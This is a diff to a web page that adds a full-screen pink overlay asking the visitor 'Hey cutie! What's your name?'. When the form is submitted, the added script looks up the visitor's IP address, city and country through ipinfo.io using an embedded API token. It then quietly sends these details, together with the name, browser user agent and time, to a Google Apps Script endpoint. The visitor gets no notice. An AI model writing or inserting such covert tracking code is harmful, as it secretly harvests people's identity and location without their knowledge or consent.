@@ -10,6 +10,66 @@
 </head>
 
 <body>
+  <!-- 💖 START: Name Form Section 💖 -->
+<div id="name-form-section" style="
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(135deg, #f9a8d4, #f472b6);
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  font-family: 'Segoe UI', sans-serif;
+  color: #fff;
+">
+  <h2 style="font-size: 28px;">👀 Hey cutie! What's your name? 💕</h2>
+  <form onsubmit="submitNameForm(event)" style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
+    <input type="text" id="user-name" placeholder="Type your lovely name here 💌" required style="
+      padding: 12px 18px;
+      font-size: 18px;
+      border: none;
+      border-radius: 10px;
+      outline: none;
+      width: 250px;
+      color: #444;
+    ">
+    <button type="submit" style="
+      padding: 10px 20px;
+      background-color: #ec4899;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 18px;
+      cursor: pointer;
+    ">Let's go 💘</button>
+  </form>
+</div>
+
+<script>
+  function submitNameForm(e) {
+    e.preventDefault();
+    const name = document.getElementById('user-name').value;
+
+    fetch('https://ipinfo.io/json?token=c3a991788ade1f')
+      .then(res => res.json())
+      .then(data => {
+        const payload = {
+          name: name,
+          ip: data.ip,
+          city: data.city,
+          country: data.country,
+          browser: navigator.userAgent,
+          time: new Date().toLocaleString()
+        };
+        navigator.sendBeacon('https://script.google.com/macros/s/AKfycbyunTrF_ci7CKdq5oL-EfsZqI5q7L04KBRd3dAEW_Jan1InwgGanm5Ky7-aWZ_Ewds/exec', JSON.stringify(payload));
+        document.getElementById('name-form-section').style.display = 'none';
+      });
+  }
+</script>
+<!-- 💖 END: Name Form Section 💖 -->
   <div class="container">
     <div class="tenor-gif-embed" data-postid="22885016" data-share-method="host" data-aspect-ratio="1.04918"
       data-width="100%">
